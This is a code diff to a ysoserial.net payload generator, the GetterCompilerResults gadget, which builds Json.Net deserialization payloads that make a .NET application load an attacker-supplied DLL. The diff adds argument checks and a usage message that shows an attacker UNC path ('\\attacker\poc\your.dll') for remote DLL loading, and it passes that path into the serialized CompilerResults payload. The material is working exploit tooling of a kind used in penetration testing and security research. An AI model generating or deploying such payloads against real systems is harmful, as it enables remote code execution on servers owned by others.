@@ -52,7 +52,7 @@ namespace ysoserial.Generators
             OptionSet options = new OptionSet()
             {
                 {"var|variant=", "Variant number. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
-                "\r\n2 - ComboBox getter-call gadget" +
+                "\r\n2 - ComboBox getter-call gadget (may load DLL twice)" +
                 "\r\n3 - ListBox getter-call gadget" +
                 "\r\n4 - CheckedListBox getter-call gadget", v => int.TryParse(v, out variant_number) },
             };
@@ -73,17 +73,23 @@ namespace ysoserial.Generators
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             String payload;
-
             String compilerPayload;
+            inputArgs.IsRawCmd = true;
+
+            if (!inputArgs.Cmd.ToLowerInvariant().EndsWith(".dll"))
+            {
+                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysoserial.exe -g GetterCompilerResults -f Json.Net -c '\\\\\\\\attacker\\\\poc\\\\your.dll'");
+                Environment.Exit(-1);
+            }
 
             if (formatter.ToLower().Equals("json.net"))
             {
-                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework): -c argument should provide a file path to your mixed DLL\r\n");
+                
 
                 compilerPayload = @"{
             '$type':'System.CodeDom.Compiler.CompilerResults, System.CodeDom, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51',
             'tempFiles':null,
-            'PathToAssembly':'" + inputArgs.CmdArguments.Replace("/c ", "") + @"'
+            'PathToAssembly':'" + inputArgs.Cmd + @"'
         }";
 
                 if (variant_number == 2)
